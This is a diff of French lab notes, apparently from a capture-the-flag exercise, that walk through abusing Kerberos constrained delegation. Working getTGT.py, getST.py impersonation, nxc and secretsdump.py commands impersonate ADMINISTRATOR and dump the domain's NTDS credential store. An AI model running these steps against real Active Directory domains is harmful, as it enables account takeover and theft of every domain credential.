@@ -44,9 +44,7 @@ GEIDIPRIME$ (hash NTLM)
 > [!important] Le SPN passé à `-spn` doit correspondre **caractère pour caractère** à la valeur dans `msDS-AllowedToDelegateTo`. Une majuscule ou un FQDN manquant provoque un `KDC_ERR_BADOPTION`.
 
 ```bash
-nxc ldap 10.2.62.87 \
-  -u 'GEIDIPRIME$' -H $NT_HASH \
-  --query "(sAMAccountName=GEIDIPRIME$)" "msds-AllowedToDelegateTo"
+nxc ldap 10.2.62.87 -u 'GEIDIPRIME$' -H $NT_HASH --query "(sAMAccountName=GEIDIPRIME$)" "msds-AllowedToDelegateTo"
 ```
 
 **Résultat obtenu :**
@@ -67,6 +65,7 @@ msDS-AllowedToDelegateTo cifs/arrakis.imperium.local/imperium.local
 
 ```bash
 getTGT.py -hashes :$NT_HASH 'IMPERIUM/GEIDIPRIME$' -dc-ip 10.2.62.87
+
 export KRB5CCNAME='GEIDIPRIME$.ccache'
 ```
 
@@ -77,11 +76,7 @@ export KRB5CCNAME='GEIDIPRIME$.ccache'
 ### Étape 3 — Obtenir un Service Ticket au nom d'ADMINISTRATOR
 
 ```bash
-getST.py -spn 'cifs/arrakis.imperium.local' \
-         -impersonate 'ADMINISTRATOR' \
-         -k -no-pass \
-         'IMPERIUM/GEIDIPRIME$' \
-         -dc-ip 10.2.62.87
+getST.py -spn 'cifs/arrakis.imperium.local' -impersonate 'ADMINISTRATOR' -k -no-pass 'IMPERIUM/GEIDIPRIME$' -dc-ip 10.2.62.87
 ```
 
 **Sortie attendue :**
@@ -100,33 +95,12 @@ getST.py -spn 'cifs/arrakis.imperium.local' \
 ```bash
 export KRB5CCNAME='ADMINISTRATOR@cifs_arrakis.imperium.local@IMPERIUM.LOCAL.ccache'
 
-nxc smb ARRAKIS.IMPERIUM.LOCAL \
-  -u 'ADMINISTRATOR' \
-  -k --use-kcache \
-  --ntds
+nxc smb ARRAKIS.IMPERIUM.LOCAL -u 'ADMINISTRATOR' -k --use-kcache --ntds
+
+secretsdump.py -k ARRAKIS.IMPERIUM.LOCAL -no-pass
 ```
 
 ---
-
-## Erreurs rencontrées
-
-### `KDC_ERR_BADOPTION`
-
-```
-[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
-[-] Probably SPN is not allowed to delegate by user GEIDIPRIME$ or initial TGT not forwardable
-```
-
-**Causes possibles :**
-
-|Cause|Solution|
-|---|---|
-|TGT non forwardable|Passer par `getTGT.py` puis `-k -no-pass`|
-|SPN incorrect (`HTTP` au lieu de `cifs`)|Vérifier via `nxc ldap --query`|
-|`ADMINISTRATOR` dans _Protected Users_|Usurper un autre compte admin|
-
----
-
 ## Mécanisme technique
 
 ### S4U2Self
